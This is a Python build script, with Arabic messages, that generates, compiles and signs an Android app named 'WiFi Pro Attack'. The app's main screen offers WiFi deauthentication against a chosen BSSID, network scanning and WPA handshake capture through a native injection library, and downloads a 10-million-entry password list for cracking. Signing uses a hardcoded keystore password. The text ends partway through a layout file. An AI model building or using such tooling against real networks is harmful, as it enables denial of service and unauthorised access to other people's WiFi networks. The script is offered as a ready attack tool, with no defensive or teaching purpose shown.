#!/usr/bin/env python3
import os
import subprocess
import shutil
import sys
import stat

PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
APP_DIR = os.path.join(PROJECT_DIR, "app")
SRC_DIR = os.path.join(APP_DIR, "src/main")
JAVA_DIR = os.path.join(SRC_DIR, "java/com/attack/pro")
RES_DIR = os.path.join(SRC_DIR, "res/layout")
CPP_DIR = os.path.join(SRC_DIR, "cpp")
ASSETS_DIR = os.path.join(SRC_DIR, "assets")

def ensure_dirs():
    for d in [JAVA_DIR, RES_DIR, CPP_DIR, ASSETS_DIR]:
        os.makedirs(d, exist_ok=True)

def write_file(path, content):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] كتبت: {path}")

def run_cmd(cmd, cwd=None):
    print(f"[EXEC] {cmd}")
    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[ERROR] {result.stderr}")
        sys.exit(1)
    return result.stdout

def create_keystore():
    keystore = os.path.join(PROJECT_DIR, "attack.keystore")
    if not os.path.exists(keystore):
        run_cmd(f"keytool -genkey -v -keystore {keystore} -alias attack -keyalg RSA -keysize 2048 -validity 10000 -storepass attackpass -keypass attackpass -dname 'CN=Attack, OU=Sec, O=Black, L=Nowhere, ST=State, C=XX'")
    return keystore

def build_apk():
    # تشغيل Gradle
    run_cmd("./gradlew assembleRelease", cwd=PROJECT_DIR)
    unsigned = os.path.join(APP_DIR, "build/outputs/apk/release/app-release-unsigned.apk")
    if not os.path.exists(unsigned):
        print("[ERROR] فشل بناء APK")
        sys.exit(1)
    # توقيع
    aligned = os.path.join(PROJECT_DIR, "app-aligned.apk")
    signed = os.path.join(PROJECT_DIR, "WiFi_Attack_Pro.apk")
    keystore = create_keystore()
    run_cmd(f"zipalign -v -p 4 {unsigned} {aligned}")
    run_cmd(f"apksigner sign --ks {keystore} --ks-pass pass:attackpass --key-pass pass:attackpass --out {signed} {aligned}")
    os.remove(aligned)
    print(f"[SUCCESS] APK النهائي: {signed}")
    return signed

def write_all_files():
    # AndroidManifest.xml
    manifest = '''<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.attack.pro">
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
    <application android:allowBackup="true" android:icon="@mipmap/ic_launcher"
        android:label="WiFi Pro Attack" android:theme="@style/Theme.AppCompat.NoActionBar">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter><action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
        </activity>
    </application>
</manifest>'''
    write_file(os.path.join(SRC_DIR, "AndroidManifest.xml"), manifest)

    # MainActivity.java
    main_activity = '''package com.attack.pro;
import android.app.DownloadManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;

public class MainActivity extends AppCompatActivity {
    static { System.loadLibrary("native_inject"); }

    private EditText etBSSID, etChannel, etInterface;
    private Button btnDeauth, btnScan, btnDownload, btnHandshake;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etInterface = findViewById(R.id.et_interface);
        etBSSID = findViewById(R.id.et_bssid);
        etChannel = findViewById(R.id.et_channel);
        btnDeauth = findViewById(R.id.btn_deauth);
        btnScan = findViewById(R.id.btn_scan);
        btnDownload = findViewById(R.id.btn_download);
        btnHandshake = findViewById(R.id.btn_handshake);

        btnDeauth.setOnClickListener(v -> {
            String iface = etInterface.getText().toString();
            String bssid = etBSSID.getText().toString();
            if (iface.isEmpty() || bssid.isEmpty()) {
                Toast.makeText(this, "أدخل الواجهة و BSSID", Toast.LENGTH_SHORT).show();
                return;
            }
            sendDeauth(iface, bssid, "ff:ff:ff:ff:ff:ff");
            Toast.makeText(this, "تم إرسال Deauth", Toast.LENGTH_SHORT).show();
        });

        btnScan.setOnClickListener(v -> {
            String iface = etInterface.getText().toString();
            if (iface.isEmpty()) {
                Toast.makeText(this, "أدخل الواجهة", Toast.LENGTH_SHORT).show();
                return;
            }
            scanNetworks(iface);
            Toast.makeText(this, "جاري المسح...", Toast.LENGTH_SHORT).show();
        });

        btnDownload.setOnClickListener(v -> {
            String url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt";
            DownloadManager.Request req = new DownloadManager.Request(Uri.parse(url));
            req.setDestinationUri(Uri.fromFile(new File(Environment.getExternalStorageDirectory(), "Download/passwords.txt")));
            req.setTitle("تحميل قاموس كلمات المرور");
            req.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
            dm.enqueue(req);
            Toast.makeText(this, "جاري تحميل 10 مليون كلمة", Toast.LENGTH_LONG).show();
        });

        btnHandshake.setOnClickListener(v -> {
            String iface = etInterface.getText().toString();
            String bssid = etBSSID.getText().toString();
            String channel = etChannel.getText().toString();
            if (iface.isEmpty() || bssid.isEmpty() || channel.isEmpty()) {
                Toast.makeText(this, "املأ جميع الحقول", Toast.LENGTH_SHORT).show();
                return;
            }
            captureHandshake(iface, bssid, channel);
            Toast.makeText(this, "بدء التقاط المصافحة...", Toast.LENGTH_SHORT).show();
        });
    }

    public native void sendDeauth(String iface, String bssid, String client);
    public native void scanNetworks(String iface);
    public native void captureHandshake(String iface, String bssid, String channel);
}'''
    write_file(os.path.join(JAVA_DIR, "MainActivity.java"), main_activity)

    # activity_main.xml
    layout = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="match_parent"
    android:orientation="vertical" android:padding="16dp" android:gravity="center">

    <EditText android:id="@+id/et_interface" android:layout_width="match_parent"
